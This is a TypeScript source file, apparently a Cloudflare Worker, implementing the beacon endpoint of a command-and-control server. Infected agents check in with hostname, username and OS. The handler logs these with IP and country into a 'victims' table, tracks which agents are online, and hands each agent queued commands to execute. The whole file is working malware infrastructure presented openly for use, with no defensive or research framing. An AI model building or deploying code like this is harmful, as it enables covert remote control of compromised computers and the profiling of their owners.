import { json, error } from "../core/response"
import { getCommand, deleteCommand } from "../storage/commands"
import { Env } from "../types/env"

export async function beacon(
  request: Request,
  env: Env
): Promise<Response> {

  if (request.method !== "POST") {
    return error("Method Not Allowed", 405)
  }

  let body: {
    id?: string
    hostname?: string
    username?: string
    os?: string
  }

  try {
    body = await request.json()
  } catch {
    return error("Invalid JSON", 400)
  }

  if (!body.id || typeof body.id !== "string") {
    return error("Invalid agent id", 400)
  }

  const agentId = body.id
  const now = new Date().toISOString()
  
  // Get IP and country from Cloudflare
  const ip = request.headers.get('cf-connecting-ip') || 'unknown'
  const country = (request.cf?.country as string) || 'unknown'
  const userAgent = request.headers.get('user-agent') || 'unknown'

  try {
    // 1️⃣ KV heartbeat (for quick online/offline check)
    await env.C2_STORAGE.put(
      `active:${agentId}`,
      "1",
      { expirationTtl: 120 }
    )

    // 2️⃣ D1 upsert into victims (AUTHORITATIVE)
    const result = await env.RESULTS_DB.prepare(`
      INSERT INTO victims (
        agent_id,
        first_seen,
        last_seen,
        ip,
        country,
        user_agent,
        hostname,
        username,
        os
      )
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
      ON CONFLICT(agent_id) DO UPDATE SET
        last_seen = excluded.last_seen,
        ip = excluded.ip,
        country = excluded.country,
        user_agent = excluded.user_agent,
        hostname = COALESCE(excluded.hostname, victims.hostname),
        username = COALESCE(excluded.username, victims.username),
        os = COALESCE(excluded.os, victims.os)
    `).bind(
      agentId,
      now,
      now,
      ip,
      country,
      userAgent,
      body.hostname ?? null,
      body.username ?? null,
      body.os ?? null
    ).run()

    console.log('D1 upsert result:', result)

    // 3️⃣ Command delivery - check KV for pending command
    const cmd = await getCommand(env.C2_STORAGE, agentId)

    if (cmd) {
      // Delete command from KV so it's only delivered once
      await deleteCommand(env.C2_STORAGE, agentId)

      return json({
        command: cmd.command,
        commandId: cmd.id,
        interval: 60
      })
    }

    // No command pending
    return json({
      command: null,
      interval: 60
    })
  } catch (err) {
    console.error('Beacon error:', err)
    // Return success even if D1 fails - don't break the agent
    return json({
      command: null,
      interval: 60
    })
  }
}